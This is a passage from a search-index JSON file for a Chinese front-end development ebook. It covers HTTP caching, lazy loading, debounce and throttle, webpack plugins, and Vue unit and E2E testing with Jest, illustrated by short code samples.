\u5de5\u5177\uff0c\u67e5\u770b\u67d0\u4e2a\u7f51\u7ad9\u7684\u6027\u80fd\u6e32\u67d3\u60c5\u51b5\uff0c\u4f1a\u8f93\u51fa\u4e00\u4e2a\u53ef\u89c6\u5316\u62a5\u544a\u6765\u5206\u6790\u6027\u80fd\u3002\u2014\u2014\u73b0\u5728\u6d4f\u89c8\u5668\u4e0b\u9762\u5df2\u7ecf\u5b89\u88c5\u8fd9\u4e2a\u63d2\u4ef6\uff0c\u53ef\u4ee5\u67e5\u770b\u67d0\u4e2a\u7f51\u9875\u7684\u6027\u80fd\u7b49\u3002</p> <p>DNS prefetch</p> <p>IP\u534f\u8bae\u8d1f\u8d23\u627e\u5230\u5bf9\u5e94\u7684\u5730\u5740</p> <p>TCP\u534f\u8bae\u8d1f\u8d23\u6570\u636e\u5b8c\u6574\u6027\u548c\u6709\u5e8f\u6027\uff0c\u4e09\u6b21\u63e1\u624b</p> <p>HTTP\u8d1f\u8d23\u5e94\u7528\u5c42\u6570\u636e</p>"},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/#_3","title":"\u7f13\u5b58","text":"<p>\u7f13\u5b58\u7684\u76ee\u7684\uff1a\u5ba2\u6237\u7aef\u53d1\u51fa\u8bf7\u6c42\uff0c\u8bf7\u6c42\u5230\u8d44\u6e90\u3002\u5982\u679c\u7b2c\u4e8c\u6b21\u53d1\u51fa\u8bf7\u6c42\uff0c\u76f4\u63a5\u4f7f\u7528\u672c\u5730\u7684\u8d44\u6e90\uff0c\u53ef\u4ee5\u51cf\u5c11\u8bf7\u6c42\u7684\u65f6\u95f4\u548c\u6d88\u8017\u3002\u7b2c\u4e09\u65b9\u7684\u5e93\uff08vue\uff09\u6216\u8005\u4e0d\u53d8\u7684JS\u4ee3\u7801\uff0c\u53ef\u4ee5\u4f7f\u7528\u7f13\u5b58\u8d44\u6e90\uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u5f00\u9500\u3002</p> <p>\u7f13\u5b58\u5206\u7c7b\uff1a\u5f3a\u7f13\u5b58\uff08expires\u3001cachecontrol \uff09\u3001\u534f\u5546\u7f13\u5b58</p>"},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/#_4","title":"\u5f3a\u5236\u7f13\u5b58","text":"<p>expires\uff1a\u5f3a\u7f13\u5b58\u7684\u5173\u952e\u5b57\u6bb5\uff0c\u6307\u5b9a\u4e00\u4e2a\u5177\u4f53\u7684\u7edd\u5bf9\u4e4b\u95f4\u4f5c\u4e3a\u7f13\u5b58\u8d44\u6e90\u7684\u8fc7\u671f\u65f6\u95f4\u3002\u518d\u6b21\u53d1\u8d77\u8bf7\u6c42\u524d\uff0c\u770b\u5f53\u524d\u7684\u65f6\u95f4\u4e0b\uff0c\u5df2\u7ecf\u7f13\u5b58\u7684\u6587\u4ef6\u662f\u5426\u8fc7\u671f\u3002\u5982\u679c\u6ca1\u6709\u8fc7\u671f\uff0c\u76f4\u63a5\u4f7f\u7528\u7f13\u5b58\u6587\u4ef6\u3002\u5982\u679c\u8fc7\u671f\uff0c\u91cd\u65b0\u8bf7\u6c42\u8d44\u6e90\u3002\u5b58\u5728\u7684\u95ee\u9898\uff1a\u5982\u679c\u672c\u5730\u65f6\u95f4\u548c\u670d\u52a1\u7aef\u65f6\u95f4\u5b58\u5728\u8bef\u5dee\uff0c\u90a3\u4e48\u7f13\u5b58\u53ef\u80fd\u5931\u6548\u3002</p> <p>cache-control\uff1a\u5f3a\u7f13\u5b58\u7684\u5173\u952e\u5b57\u6bb5\uff1a\u8bbe\u7f6e\u4e00\u4e2a\u76f8\u5bf9\u65f6\u95f4\uff0c\u7cbe\u786e\u63a7\u5236\u8d44\u6e90\u7684\u7f13\u5b58\uff08\u8bbe\u7f6e public private no-cache no-store max-age s-maxage \u7b49\u5177\u4f53\u53c2\u6570\u63a7\u5236\u7f13\u5b58\u7684\u4f7f\u7528\u5bf9\u8c61\u548c\u4f7f\u7528\u65f6\u95f4\uff09\u3002cache-control \u4f18\u5148\u4e8e expires\u3002</p>"},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/#_5","title":"\u534f\u5546\u7f13\u5b58","text":"<p>\u5ba2\u6237\u7aef\u53d1\u8d77\u8bf7\u6c42\u65f6\uff0c\u628a\u672c\u5730\u7f13\u5b58\u7684 last-modify \u53d1\u9001\u5230\u670d\u52a1\u7aef\u3002\u670d\u52a1\u7aef\u534f\u5546\u5224\u65ad\u662f\u5426\u4f7f\u7528\u7f13\u5b58\u3002\u5982\u679c\u8fd9\u4e2a\u8d44\u6e90\u66f4\u6539\u4e86\uff0c\u670d\u52a1\u7aef\u8fd4\u56de200\uff0c\u5e76\u8fd4\u56de\u65b0\u7684\u8d44\u6e90\uff1b\u5982\u679c\u670d\u52a1\u7aef\u8d44\u6e90\u6ca1\u6709\u66f4\u6539\uff0c\u670d\u52a1\u7aef\u8fd4\u56de304\u3002</p> <p>\u5982\u679c\u5ba2\u6237\u7aef\u53d1\u9001\u4e86\u4e00\u4e2a\u5e26\u6761\u4ef6\u7684GET \u8bf7\u6c42\u4e14\u8be5\u8bf7\u6c42\u5df2\u88ab\u5141\u8bb8\uff0c\u800c\u6587\u6863\u7684\u5185\u5bb9\uff08\u81ea\u4e0a\u6b21\u8bbf\u95ee\u4ee5\u6765\u6216\u8005\u6839\u636e\u8bf7\u6c42\u7684\u6761\u4ef6\uff09\u5e76\u6ca1\u6709\u6539\u53d8\uff0c\u5219\u670d\u52a1\u5668\u5e94\u5f53\u8fd4\u56de\u8fd9\u4e2a304\u72b6\u6001\u7801\u3002\u7b80\u5355\u7684\u8868\u8fbe\u5c31\u662f\uff1a\u670d\u52a1\u7aef\u5df2\u7ecf\u6267\u884c\u4e86GET\uff0c\u4f46\u6587\u4ef6\u672a\u53d8\u5316\u3002</p> <p>\u7f3a\u9677\uff1a\u8fd9\u4e2a\u65f6\u95f4\u7cbe\u786e\u5230\u79d2\uff0c\u5982\u679c\u6587\u4ef6\u57281S\u5185\u5df2\u7ecf\u4fee\u6539\uff0c\u5c31\u4e0d\u80fd\u4f7f\u7528\u8fd9\u4e2a\u6280\u672f\u3002\u53ef\u4ee5\u8bbe\u7f6e last-modified/If-modified-since \u52a0\u4e0a etag/if-none-match \u5339\u914d\u7f13\u5b58\u7cfb\u7edf\uff0c\u76f8\u5bf9\u7a33\u5b9a\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528 webpack \u7ed3\u5408 nginx Apache \u8bbe\u7f6e\u7f13\u5b58\u5b57\u6bb5\uff08\u670d\u52a1\u7aef\u8fd0\u7ef4\uff09\u3002</p>"},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/#_6","title":"\u7f13\u5b58\u6d41\u7a0b","text":"<ol> <li>\u83b7\u53d6\u6587\u4ef6</li> <li>\u6587\u4ef6\u8fd4\u56de expires or cache-control\uff0c\u8bbe\u7f6e\u8fc7\u671f\u65f6\u95f4\uff0c\u5e26\u4e0a etag or last-modified \u5b57\u6bb5</li> <li>\u518d\u6b21\u8bf7\u6c42\u3002\u6d4f\u89c8\u5668\u5148\u67e5\u8be2 express or cache-control \u662f\u5426\u8fc7\u671f\u3002\u5982\u679c\u6ca1\u6709\u8fc7\u671f\uff0c\u5f3a\u7f13\u5b58\u751f\u6548\uff0c\u4e0d\u53d1\u51fa\u7f51\u7edc\u8bf7\u6c42\uff0c\u76f4\u63a5\u4f7f\u7528\u7f13\u5b58\u6587\u4ef6\u3002\u5982\u679c\u5f3a\u7f13\u5b58\u5931\u6548\uff0c\u5e26\u4e0a etag or last-modified\uff0c\u4f7f\u7528 if-none-match or if-modified-since \u5b57\u6bb5\uff0c\u8be2\u95ee\u670d\u52a1\u5668\u662f\u5426\u8fc7\u671f</li> <li>\u5982\u679c\u6ca1\u6709\u8fc7\u671f\uff0c\u76f4\u63a5\u4f7f\u7528304\uff0c\u4f7f\u7528\u7f13\u5b58\u6587\u4ef6\uff1b\u5982\u679c\u8fc7\u671f\uff0c\u76f4\u63a5\u4f7f\u7528200\uff0c\u8fd4\u56de\u65b0\u6587\u4ef6\u3002</li> </ol> <p>webpack \u6253\u5305\u7f13\u5b58\u95ee\u9898 1. hash \u6574\u4e2a\u9879\u76ee\u7684hash 2. chunkhash \u5165\u53e3\u6587\u4ef6\u4f9d\u8d56 hash 3. contenthash \u6587\u4ef6\u5185\u5bb9\u7684 hash</p>"},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/#_7","title":"\u6d4f\u89c8\u5668\u6e32\u67d3\u539f\u7406","text":""},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/#_8","title":"\u9996\u9875\u767d\u5c4f\u4f18\u5316","text":"<p>page-skeleton-webpack-plugin \u63d2\u4ef6\uff0c\u6216\u8005 ant-design \u63d2\u4ef6</p> <p>\u754c\u9762\u521d\u59cb\u52a0\u8f7d\u65f6\uff0c\u5177\u4f53\u7684\u6570\u636e\u548c\u56fe\u7247\u8fd8\u6ca1\u6709\u52a0\u8f7d\uff0c\u53ef\u4ee5\u5148\u52a0\u8f7d\u4e00\u4e2a\u9aa8\u67b6\u5c4f\uff08loading\uff09\uff0c\u7136\u540e\u6570\u636e\u8bf7\u6c42\u7ed3\u675f\u540e\uff0c\u4f7f\u7528\u771f\u5b9e\u7684\u6570\u636e\u66ff\u6362\u539f\u6765\u7684loading\u72b6\u6001\u3002</p> <p>\u8682\u8681 ant-design \u4f7f\u7528\u4e86\u8fd9\u4e2a\u7ec4\u4ef6 https://ant.design/components/skeleton-cn/</p> <pre><code>\u7f51\u7edc\u8f83\u6162\uff0c\u9700\u8981\u957f\u65f6\u95f4\u7b49\u5f85\u52a0\u8f7d\u5904\u7406\u7684\u60c5\u51b5\u4e0b\u3002\n\u56fe\u6587\u4fe1\u606f\u5185\u5bb9\u8f83\u591a\u7684\u5217\u8868/\u5361\u7247\u4e2d\u3002\n\u53ea\u5728\u7b2c\u4e00\u6b21\u52a0\u8f7d\u6570\u636e\u7684\u65f6\u5019\u4f7f\u7528\u3002\n</code></pre> <pre><code>import { Skeleton } from 'antd';\nReactDOM.render(&lt;Skeleton /&gt;, mountNode);\n</code></pre> <p>\u5fae\u4efb\u52a1\uff1amicroTask</p> <p>\u4e0d\u540c\u7684JS\u6267\u884c\u7684\u4e8b\u4ef6\u961f\u5217\u4e0d\u540c\uff0c\u6267\u884c\u987a\u5e8f\u4e0d\u540c\u3002\u5fae\u4efb\u52a1\u4f18\u5148\u6267\u884c\u3002</p>"},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/#_9","title":"\u9632\u6296\u8282\u6d41","text":"<p>\u9632\u6296\uff1a\u754c\u9762\u6eda\u52a8\u65f6\uff0c\u9694100ms\u89e6\u53d1\u4e00\u6b21\u56de\u8c03\u51fd\u6570\uff0c\u5171\u6267\u884cN\u6b21\u51fd\u6570\u3002</p> <p>\u8282\u6d41\uff1a\u9891\u7e41\u6eda\u52a8\u754c\u9762\uff0c\u76f4\u5230\u6700\u540e\u4e00\u6b21\u6eda\u52a8\u5b8c\uff0c\u95f4\u9694100ms\u540e\uff0c\u6267\u884c\u4e00\u6b21\u51fd\u6570\u3002</p> <p>\u8fd9\u4e24\u4e2a\u5f88\u5173\u952e\uff0c\u6700\u597d\u5b9e\u73b0\u624b\u5199\u51fd\u6570\uff08locash\u4e2d\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u51fd\u6570\uff09</p> <pre><code>const debounce = (fn, wait = 100) =&gt; {\n  let timer = null;\n  return (...args) =&gt; {\n    if (timer) {\n      clearTimeout(timer);\n    }\n    timer = setTimeout(() =&gt; {\n      fn.apply(this, args);\n    }, wait);\n  };\n};\n\nconst throttle = (fn, wait = 100) =&gt; {\n  let lastTime = 0; // \u8fd9\u91cc\u4e0d\u80fd\u7528const\n  return function(...args) {\n    let now = new Date();\n    if (now - lastTime &gt; wait) {\n      lastTime = now;\n      fn.apply(this, args);\n    }\n  }\n}\n\nsetInterval(\n    throttle(() =&gt; {\n    console.log(1);\n  }, 1000),\n  20\n);\n</code></pre> <p>\u6ce8\u610f\uff0capply \u548c call \u7684 \u533a\u522b\uff1aapply \u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6570\u7ec4\uff0ccall \u7684\u7b2c\u4e8c-N\u4e2a\u53c2\u6570\u662f\u72ec\u7acb\u7684\u5143\u7d20\u3002\u6240\u4ee5 apply \u4f7f\u7528\u8303\u56f4\u66f4\u591a\u3002A.fn.apply(B, args) \u8fd9\u6837B\u5c31\u53ef\u4ee5\u4f7f\u7528A\u4e0a\u9762\u7684\u65b9\u6cd5\u3002\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0cthis \u51fd\u6570\u4f7f\u7528\u4e86 func \u7684\u65b9\u6cd5\uff0c\u53c2\u6570\u662f args\uff0c\u5e76\u6267\u884c</p> <pre><code>let A = {\n  add: function(a, b) {\n    return a + b;\n  }\n};\n\nlet B = {\n  'age': 20,\n  'age2': 30\n};\n\nA.add.apply(B, [10, 20]);\nA.add.call(B, 20, 30);\n</code></pre>"},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/#_10","title":"\u56fe\u7247\u61d2\u52a0\u8f7d","text":"<p>\u6280\u672f\u6d41\u7a0b\uff1a\u5982\u679c\u754c\u9762\u5f88\u957f\uff0c\u9700\u8981\u5230\u6eda\u52a8\u5230\u56fe\u7247\u4f4d\u7f6e\u65f6\uff0c\u624d\u663e\u793a\u5177\u4f53\u7684\u56fe\u7247\u3002</p> <p>\u9ed8\u8ba4\u7684\u56fe\u7247\u4e2d\uff0c\u8bbe\u7f6e\u4e00\u4e2a SRC \u5c5e\u6027\uff0c\u6682\u65f6\u5b58\u653e\u4e00\u4e2a\u865a\u62df\u7684\u8def\u5f84\uff0c\u8fd9\u4e2a\u8def\u5f84\u4e0d\u4f1a\u53d1\u51fa\u8bf7\u6c42\u3002\u7136\u540e\u5728 data-src \u4e2d\uff0c\u653e\u7f6e\u4e00\u4e2a\u771f\u5b9e\u7684\u8def\u5f84\u3002\u5f53\u754c\u9762\u6eda\u52a8\u65f6\uff0c\u8ba1\u7b97\u56fe\u7247\u7684\u4f4d\u7f6e\u548c\u754c\u9762\u6eda\u52a8\u7684\u8ddd\u79bb\uff0c\u5982\u679c\u56fe\u7247\u5373\u5c06\u663e\u793a\u6216\u8005\u5df2\u7ecf\u663e\u793a\uff0c\u90a3\u4e48\u4f7f\u7528JS\u66f4\u6539\u56fe\u7247\u7684SRC\u5c5e\u6027\uff0c\u53d1\u51fa\u8bf7\u6c42\uff0c\u663e\u793a\u56fe\u7247\u3002\u5426\u5219\u4e0d\u663e\u793a\u771f\u5b9e\u7684\u56fe\u7247\u3002</p> <pre><code>const imgs = document.getElementsByTagName('img');\nconst viewHeight = window.innerHeight || document.documentElement.clientHeight;\nlet num = 0;\n\nfunction lazyload() {\n  for (let i = num; i &lt; imgs.length; i++) {\n    let distance = viewHeight - imgs[i].getBoundingClientRect().top;\n    if (distance &gt;= 0) {\n      imgs[i].src = imgs[i].getAttribute('data-src');\n      num = i + 1;\n    }\n  }\n}\n\n&lt;img src='loading.png' data-src='http://123.jpg'/&gt;\n</code></pre>"},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/#_11","title":"\u670d\u52a1\u7aef\u6027\u80fd\u4f18\u5316","text":"<p>SSR \u5b9e\u73b0</p> <p>\u5982\u679c\u662f\u5355\u9875\u9762\uff0c\u5f88\u5c11\u7684\u7528\u6237\u4ea4\u4e92\uff0c\u5728\u5ba2\u6237\u7aef\u6e32\u67d3\uff1b\u5982\u679c\u662f\u9996\u9875\uff0c\u5728\u670d\u52a1\u7aef\u76f4\u63a5\u6e32\u67d3\u6210HTML\uff0c\u7528\u6237\u7aef\u76f4\u63a5\u663e\u793a\uff0c\u4e0d\u9700\u8981\u6d4f\u89c8\u5668\u518d\u6b21\u6e32\u67d3JS\u4ee3\u7801\u3002\u5177\u4f53\u5185\u5bb9\u8be6\u89c1\u7f51\u6613\u8bfe\u7a0b\u3002</p>"},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/#_12","title":"\u79fb\u52a8\u7aef\u6027\u80fd\u4f18\u5316","text":"<p>\u79fb\u52a8\u7aef\u7684\u7279\u70b9\uff1a\u754c\u9762\u5f88\u5c0f\uff0c\u5185\u5bb9\u5f88\u591a\uff0c\u901a\u5e38\u4f7f\u7528\u5217\u8868\u663e\u793a\u90e8\u5206\u5185\u5bb9\u3002\u6b64\u65f6\u53ef\u4ee5\u4f7f\u7528\u5217\u8868\u4e2d\u90e8\u5206\u663e\u793a\u5b9e\u73b0\u6027\u80fd\u4f18\u5316\uff08\u83b7\u53d6\u754c\u9762\u7684\u663e\u793a\u7684\u5217\u8868\uff0c\u548c\u672a\u663e\u793a\u7684\u5217\u8868Index\uff0c\u672a\u663e\u793a\u7684\u90e8\u5206\u4f7f\u7528DIV\u5360\u4f4d\u5b9e\u73b0\uff09\u3002</p>"},{"location":"ebook-kaikeba-frontend/01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/#_13","title":"\u6846\u67b6\u4f18\u5316","text":"<p>pureComponent</p> <p>async-component</p> <p>\u4ee3\u7801\u53ef\u89c6\u5316\uff0cwebpack \u63d2\u4ef6</p> <pre><code>const BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;\n\nmodule.exports = {\n  plugins: [\n    new BundleAnalyzerPlugin()\n  ]\n};\n</code></pre> <p>\u4f01\u4e1a\u4e2d\u5982\u4f55\u5b9e\u73b0\u6027\u80fd\u4f18\u5316\uff1f\u4ece\u4e0a\u9762\u7684\u89d2\u5ea6\u56de\u7b54\uff08Performance\u8fdb\u884c\u6d4b\u8bd5\uff0c\u6027\u80fd\u76d1\u63a7\uff0c\u7136\u540e\u6839\u636e\u95ee\u9898\uff0c\u6709\u9488\u5bf9\u6027\u7684\u8fdb\u884c\u4f18\u5316\uff09\u3002</p>"},{"location":"ebook-kaikeba-frontend/02%20%E5%89%8D%E7%AB%AF%E6%B5%8B%E8%AF%95/","title":"2021-08-17","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 5628  \u9605\u8bfb12\u5206\u949f</p>"},{"location":"ebook-kaikeba-frontend/02%20%E5%89%8D%E7%AB%AF%E6%B5%8B%E8%AF%95/#_1","title":"\u524d\u7aef\u81ea\u52a8\u5316\u6d4b\u8bd5","text":"<p>\u4e3b\u8981\u5185\u5bb9\uff1a\u524d\u7aef\u6d4b\u8bd5\u5206\u7c7b\uff1bVUE\u4e2d\u5982\u4f55\u4f7f\u7528\u5355\u5143\u6d4b\u8bd5\uff1b\u6d4b\u8bd5\u9a71\u52a8\u5f00\u53d1TDD\u601d\u8def</p>"},{"location":"ebook-kaikeba-frontend/02%20%E5%89%8D%E7%AB%AF%E6%B5%8B%E8%AF%95/#_2","title":"\u600e\u6837\u4f7f\u7528","text":"<p>\u5728VUE-CLI \u6216\u8005 create-react-app \u4e2d\uff0c\u521d\u59cb\u5316\u9879\u76ee\u4f1a\u8bbe\u7f6e\u4f7f\u7528\u5355\u5143\u6d4b\u8bd5\u548cE2E\u6d4b\u8bd5\u3002</p> <p>\u5355\u5143\u6d4b\u8bd5\u9488\u5bf9\u4e00\u4e2aAPI\u6216\u8005\u4e00\u4e2a\u5c0f\u6a21\u5757\u8fdb\u884c\u6d4b\u8bd5\uff1bE2E\u9488\u5bf9\u4e00\u4e2a\u529f\u80fd\u8fdb\u884c\u6d4b\u8bd5\u3002\u56fd\u5185\u4ea7\u54c1\u7ecf\u7406\u7ecf\u5e38\u4fee\u6539\u9700\u6c42\uff0c\u6240\u4ee5E2E\u6d4b\u8bd5\u90e8\u7f72\u4e0d\u591a\u3002\u521d\u59cb\u5316\u65f6\uff0c\u53ef\u4ee5\u9009\u62e9\u6d4b\u8bd5\u6846\u67b6\uff08JEST \u6216\u8005 Mocha+Chai\uff09</p>"},{"location":"ebook-kaikeba-frontend/02%20%E5%89%8D%E7%AB%AF%E6%B5%8B%E8%AF%95/#_3","title":"\u6d4b\u8bd5\u597d\u5904","text":"<ul> <li>\u4fbf\u4e8e\u540e\u671f\u7f16\u5199\u63a5\u53e3\u6587\u6863</li> <li>\u8282\u7701\u624b\u52a8\u6d4b\u8bd5\u7684\u65f6\u95f4\u548c\u4e0d\u5168\u9762\u6027</li> <li>\u51cf\u5c11\u5f00\u53d1\u65f6\u4ea7\u751fbug</li> <li>\u6539\u8fdb\u8bbe\u8ba1\uff1b\u4fc3\u8fdb\u4ee3\u7801\u91cd\u6784</li> </ul>"},{"location":"ebook-kaikeba-frontend/02%20%E5%89%8D%E7%AB%AF%E6%B5%8B%E8%AF%95/#_4","title":"\u5355\u5143\u6d4b\u8bd5","text":"<pre><code>function add(a, b) {\n  return Number(a) + Number(b);\n}\n\ndescribe('test add two var', () =&gt; {\n  it('two number', () =&gt; {\n    expect(add(1, 2)).toBe(3);\n  });\n  // \u5065\u58ee\u6027\u6d4b\u8bd5\uff08\u4f20\u5165\u7684\u6570\u636e\u7c7b\u578b\u4e0d\u5bf9\uff0c\u6216\u8005\u4e0d\u4f20\u53c2\uff09\n  it('string add', () =&gt; {\n    expect(add('1', '3')).toBe(4);\n  });\n});\n</code></pre> <p>\u6d4b\u8bd5\u4ee3\u7801\u53ef\u4ee5\u4fdd\u8bc1\u540e\u7eed\u7684\u4fee\u6539\u4e0d\u4f1a\u51fa\u95ee\u9898\uff08\u4e0d\u4f1a\u88ab\u5176\u4ed6\u4eba\u6539\u9519\uff09\uff1b</p> <p>\u6d4b\u8bd5\u4ee3\u7801\u53ef\u4ee5\u5f88\u597d\u7684\u6539\u5199\u6210\u63a5\u53e3\u6587\u6863</p>"},{"location":"ebook-kaikeba-frontend/02%20%E5%89%8D%E7%AB%AF%E6%B5%8B%E8%AF%95/#_5","title":"\u63d0\u4ea4\u524d\u6d4b\u8bd5\u2014\u2014\u54c8\u58eb\u5947\u63d2\u4ef6","text":"<p>\u54c8\u58eb\u5947\u63d2\u4ef6\uff08Hushy\uff09\u53ef\u4ee5\u5728commit\u524d\uff0c\u6267\u884c\u5355\u5143\u6d4b\u8bd5\uff1b\u901a\u8fc7\u6d4b\u8bd5\u540e\u624d\u80fd\u63d0\u4ea4\u4ee3\u7801</p> <p>npm install husky --save-dev</p> <p>\u7136\u540e\u5728 package.json \u4e2d\u589e\u52a0\u914d\u7f6e</p> <pre><code>{\n  \"husky\": {\n    \"hooks\": {\n      \"pre-commit\": \"npm test\",\n      \"pre-push\": \"npm test\",\n    }\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/02%20%E5%89%8D%E7%AB%AF%E6%B5%8B%E8%AF%95/#vue","title":"VUE\u4e2d\u5355\u5143\u6d4b\u8bd5","text":"<p>APP.vue \u6a21\u677f\u6587\u4ef6</p> <pre><code>&lt;template&gt;\n    &lt;div id=\"app\"&gt;\n    &lt;div&gt;\n      &lt;span&gt;{{message}}&lt;/span&gt;\n      &lt;button @click=\"changeMsg\"&gt;click&lt;/button&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\nexport default {\n  name: 'app',\n  data() {\n    return {\n      message: 'helloMili'\n    }\n  },\n  created() {\n    this.message = 'created';\n  },\n  components: {},\n  methods: {\n    changeMsg() {\n      this.message = 'clicked'\n    }\n  }\n}\n&lt;/script&gt;\n</code></pre> <p>\u5b98\u7f51\u6d4b\u8bd5\u6587\u4ef6\u793a\u4f8b</p> <pre><code>import { mount } from '@vue/test-utils';\nimport Counter from './counter';\n\n// \u6302\u8f7d\u7ec4\u4ef6\uff0c\u83b7\u53d6\u5bf9\u5e94\u7684\u5305\u88f9\u5668\nconst wrapper = mount(Counter);\n\n// \u8bbf\u95eeVue\u5b9e\u4f8b\uff0c\u540e\u7eed\u8fdb\u884c\u6d4b\u8bd5\nconst vm = wrapper.vm;\n</code></pre> <p>\u5b9e\u9645\u6d4b\u8bd5\u6587\u4ef6 test.spec.js</p> <p>\u6d4b\u8bd5\u9759\u6001\u65b9\u6cd5\uff1b\u7ec4\u4ef6\u52a0\u8f7d\u540e\u72b6\u6001\uff0c\u7ec4\u4ef6\u54cd\u5e94\u540e\u72b6\u6001</p> <pre><code>import Vue from 'vue';\nimport Test from '@/components/Test.vue';\nimport { mount } from '@vue/test-utils';\n\ndescribe('test fn', () =&gt; {\n  it('static fn', () =&gt; {\n    expect(typeof Test.created).toBe('function');\n  });\n  it('mounted', () =&gt; {\n    let vm = new Vue(Test).$mount();\n    expect(vm.message).toBe('ctreated');\n  });\n  it('trigger btn', () =&gt; {\n    let wrapper = mount(Test);\n    wrapper.find('button').trigger('click');\n    expect(wrapper.vm.message).toBe('clicked');\n  });\n});\n</code></pre> <p>Todolist.vue</p> <pre><code>&lt;template&gt;\n    &lt;div&gt;\n    &lt;h1&gt;List&lt;/h1&gt;\n    &lt;input v-model=\"todoText\" @keyup.enter=\"enterText\" type=\"text\"/&gt;\n    &lt;ul&gt;\n      &lt;li v-for=\"todo in todos\"&gt;{{todo.text}}&lt;/li&gt;\n    &lt;/ul&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\nexport default {\n  data() {\n    return {\n      todoText: '',\n      todos: [],\n      completeds: [],\n    }\n  },\n  methods: {\n    enterText() {\n    }\n  },\n}\n&lt;/script&gt;\n&lt;style scoped&gt;\n&lt;/style&gt;\n</code></pre> <p>\u6d4b\u8bd5\u4ee3\u7801</p> <pre><code>import { shallowMount } from '@vue/test-utils';\nimport Todolist from '@/components/Todolist';\n\ndescribe('test todolist', () =&gt; {\n  let wrapper;\n  beforeEach(() =&gt; {\n    wrapper = shallowMount(Todolist);\n  });\n  afterEach(() =&gt; {\n    wrapper = null;\n  });\n  it('test input', () =&gt; {\n    let res = 'test text';\n    wrapper.find('.todo-list').setValue(res);\n    expect(wrapper.vm.todoText).toBe(res);\n  });\n\n  it('test enter keydown', () =&gt; {\n    const len = wrapper.vm.todos.length;\n    const input = wrapper.find('.todo-list');\n    input.setValue('Bilibili');\n    input.trigger('keyup.enter');\n    expect(wrapper.vm.todos.length).toBe(length + 1);\n  });\n});\n</code></pre> <p>\u5f02\u6b65\u4e8b\u4ef6\u6d4b\u8bd5\uff08Mock\u6570\u636e\uff09</p> <pre><code>&lt;template&gt;\n    &lt;div&gt;\n    &lt;h1&gt;axios&lt;/h1&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\nexport default {\n  data() {\n    return {\n      usetInfo: {}\n    }\n  },\n  created() {\n    this.$axios.get('/kkd/users').then(res =&gt; {\n      this.userInfo = res.data\n    });\n  }\n}\n&lt;/script&gt;\n</code></pre> <p>\u6d4b\u8bd5\u4ee3\u7801</p> <p>\u5982\u679c\u9700\u8981\u767b\u5f55\u9a8c\u8bc1\uff08token\uff09\uff0c\u9700\u8981\u63d0\u524d\u83b7\u53d6token\uff1b\u6d4b\u8bd5\u4e00\u4e2a\u7ec4\u4ef6\u524d\u540e\uff0c\u9700\u8981\u9884\u5904\u7406\uff0c\u548c\u6e05\u7406\u4ee3\u7801\u3002</p> <pre><code>import AxiosTest from '@/components/AxiosTest.vue';\nimport { shallowMount, createLocalVue } from '@vue/test-utils';\nimport axios from 'axios';\n\njest.mock('axios');\n\nconst localVue = createLocalVue();\nlocalVue.prototype.$axios = axios;\n\ndescribe('test axios', () =&gt; {\n  let wrapper;\n  beforeAll(() =&gt; {\n    axios.mockClear();\n    wrapper = shallowMount(AxiosTest, {\n      localVue,\n      stubs: ['app-button']\n    });\n  });\n\n  afterAll(() =&gt; {\n    wrapper.destory();\n  });\n})\n</code></pre>"},{"location":"ebook-kaikeba-frontend/02%20%E5%89%8D%E7%AB%AF%E6%B5%8B%E8%AF%95/#_6","title":"\u6d4b\u8bd5\u8986\u76d6\u7387","text":"<p>jest \u4e2d\u914d\u7f6e\u53ef\u4ee5\u8bbe\u7f6e\u6d4b\u8bd5\u8986\u76d6\u7387\uff08\u5927\u9879\u76ee\u4e2d\uff0c\u6d4b\u8bd5\u8986\u76d6\u7387\u5fc5\u987b\u8fbe\u6807\u624d\u80fd\u901a\u8fc7\u63d0\u4ea4\uff09</p> <pre><code>{\n  \"jest\": {\n    \"preset\": \"@vue/cli-plugin-unit-jest\",\n    \"collectCoverage\": true,\n    \"collectCoverageFrom\": [\n      \"src/components/**/*.{js,vue}\"\n    ],\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/02%20%E5%89%8D%E7%AB%AF%E6%B5%8B%E8%AF%95/#e2e","title":"E2E \u6d4b\u8bd5","text":"<p>\u4ece\u7528\u6237\u6216\u8005\u4ea7\u54c1\u7ecf\u7406\u7684\u89d2\u5ea6\u90e8\u7f72\u6d4b\u8bd5\uff08\u516c\u5171\u7ec4\u4ef6\u53ef\u4ee5\u8fdb\u884c E2E \u6d4b\u8bd5\uff0c\u8fd9\u6837\u4fee\u6539\u540e\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u4f1a\u5f71\u54cd\u5df2\u6709\u529f\u80fd\uff09</p> <pre><code>describe(\"Test\", () =&gt; {\n  it('Visit root page', () =&gt; {\n    